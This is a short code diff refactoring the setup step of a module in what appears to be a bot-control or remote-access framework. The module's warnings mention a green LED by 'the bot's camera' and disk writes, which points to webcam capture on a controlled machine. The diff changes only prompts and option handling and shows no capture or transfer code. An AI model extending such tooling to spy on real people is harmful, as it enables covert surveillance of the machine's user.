@@ -19,14 +19,19 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self) -> Tuple[bool, Optional[dict]]:
-        confirm = self._view.prompt("Are you sure you want to continue? [Y/n]", [
-            ("A green LED will show next to the bot's camera (for about a second).", "attention"),
-            ("This module also touches the disk.", "attention")
-        ]).lower()
+    def get_setup_messages(self) -> List[str]:
+        return [
+            "Local output name (Leave empty for <RANDOM>): "
+        ]
 
-        if not confirm or confirm == "y":
-            output_name = self._view.prompt("Local output name [ENTER for <RANDOM>]: ")
+    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+        should_continue = self._view.should_continue([
+            "A green LED will show next to the bot's camera (for about a second).",
+            "This module also touches the disk."
+        ])
+
+        if should_continue:
+            output_name = set_options[0]
 
             if not output_name:
                 output_name = random_string(8)
